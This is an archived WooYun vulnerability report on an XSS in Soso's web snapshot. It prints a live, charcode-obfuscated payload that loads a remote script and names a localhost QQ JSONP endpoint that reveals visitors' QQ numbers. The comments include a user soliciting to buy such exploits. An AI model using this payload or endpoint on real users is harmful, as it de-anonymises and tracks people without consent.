{"id": 8834, "wybug_id": "wooyun-2015-0122052", "wybug_title": "一个被用来抓取访客QQ的XSS（二）Chrome隐身模式照样抓！", "wybug_corp": "腾讯", "wybug_author": "路人甲", "wybug_date": "2015-06-22 00:21", "wybug_open_date": "2015-08-07 11:26", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-07：\t细节向公众公开  简要描述： 这几天JSONP 抓ID啥的被热议，看到评论里不少人说，得开隐身模式！然而，你们以为开了chrome隐身模式，就抓不到了么！Too Young...sevael nellaf will appear. 详细说明：  漏洞比较简单，也是正在被一些网站利用中。1. 首先是一个搜搜的XSShttp://www.soso.com/websnapshot??ie=utf8&url=http%3A%2F%2Fqq.mb5u.com%2Fabout.html&did=65b505059bf9e58d-1152efedfc5effe9-134fa5d0b31d02dc09750e547cb02b87&k=e99b271f73c314d46de1735302e8b5fa&encodedQuery=&query=qq.mb5u.com%2Fabout.html&&pid=sogou-wsse-7535bbb91c8fde34&duppid=1&rfrom=soso&w=01020400&m=0&st=0&uid=11090&ref=&furl=http%3A%2F%2Fwww.wangdaixitong.com%2Findex.html&title=%E9%87%91%E9%92%B1%E6%9F%9C%E7%BD%91%E8%B4%B7%E7%B3%BB%E7%BB%9F-P2P%E7%BD%91%E8%B4%B7%E7%B3%BB%E7%BB%9F_%E7%BD%91%E8%B4%B7%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91_%E8%82%A1%E7%A5%A8%E9%85%8D%E8%B5%84%E7%B3%BB%E7%BB%9F_%E8%82%A1%E6%9D%83%E4%BC%97%E7%AD%B9%E7%B3%BB%E7%BB%9F%2C%E6%9C%80%E6%9D%83%E5%A8%81%E3%80%81%E6%9C%80%E4%B8%93%E4%B8%9A%E7%9A%84P2P%E7%BD%91%E8%B4%B7%E6%BA%90%E7%A0%812. 搜搜的快照没过滤好，导致 http://qq.mb5u.com/about.html 这个页面的XSS代码，在搜搜域下被执行。\n<div style=\"display:none;\"><img src=\"z\" onerror=\"/*_Ka*/var/*hCnn*/IHse/*Wav*/=/*fBJAp*/\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067./*lsxIcC*/\\u0066\\u0072\\u006f\\u006d\\u0043\\u0068\\u0061\\u0072\\u0043\\u006f\\u0064\\u0065;/*ksHMx*/var/*KuVkYP*/NWVbw_QY/*_ztkzYy*/=/*_pNZE*/\\u0065\\u0076\\u0061\\u006c;NWVbw_QY(IHse(118,97,114,32,111,72,101,97,100,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,72,69,65,68,39,41,46,105,116,101,109,40,48,41,59,118,97,114,32,111,83,99,114,105,112,116,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,111,83,99,114,105,112,116,46,116,121,112,101,61,34,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,59,111,83,99,114,105,112,116,46,115,114,99,61,34,104,116,116,112,58,47,47,113,113,46,109,98,53,117,46,99,111,109,47,113,113,46,106,115,34,59,111,72,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,111,83,99,114,105,112,116,41,59));\"></div>\n这个代码会调用一个FLASH，加密后的JS代码最终通过FLASH来调用执行。FLASH本身做了一定的处理。反正最终会被执行，不管FLASH里的逻辑了，直接查看被运行的JS代码：\n\n可以看到，最终实际上是调用了一个JSONP接口：loadJS(\"http://localhost.ptlogin2.qq.com:4300/pt_get_uins?callback=ptui_getuins_CB&r=0.3257604003883898&pt_local_tk=-1870224297\",null,'utf-8');经过测试，这个JSONP接口，可以在soso.com和qq.com域下被调用，而不能在其他域下被调用。其次，虽然URL里有一个类似csrf token的东西pt_local_tk，然而，好像并没有什么卵用！！！，置空这个参数一样可以返回结果。\n\n比较有意思的是：localhost.ptlogin2.qq.com 是一个映射到127.0.0.1 的域名，经过查看，4300端口为qq开启的。这个JSONP接口，不论你是普通浏览，还是隐身浏览，都是可以抓取到你当前正在登录的QQ号码信息的。\n\n   漏洞证明：  见详细说明。   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-06-23 11:24 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-23 12:22 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  你这么厉害，能帮我找回我女朋友吗？QQ电话都拉黑    \n     2015-06-23 17:33 |    \t\t落叶 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | xxxx)\t\t \n  就分析分析人家咋利用的而已  厉害就自己去挖个新的 我这RMB收 哈哈我上个接口就是你举报的吧?    \n     2015-06-23 18:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @落叶 仇人相见哈    \n     2015-06-23 18:17 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  sevael nellaf will appear.这？我好像知道了些什么！！！    \n     2015-06-23 19:40 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  @落叶 抓获取QQ访客不是蛮容易挖的？    \n     2015-06-26 02:43 |    \t\t落叶 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | xxxx)\t\t \n  @xsser 不是仇人啊 兄弟们 都是网上混口饭吃 咱也不做恶有这方便资源的兄弟请联系我 诚意长期收购 企鹅 六七0851    \n     2015-06-26 02:43 |    \t\t落叶 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | xxxx)\t\t \n  @刘海哥 兄弟那有吗 加俺Q 六70851  诚心诚意的    \n     2015-07-20 18:20 |    \t\tbabycd520 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | babycd520)\t\t \n  @落叶 我都被搞关门了 你还在做啊 现在一个XSS能管几天    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}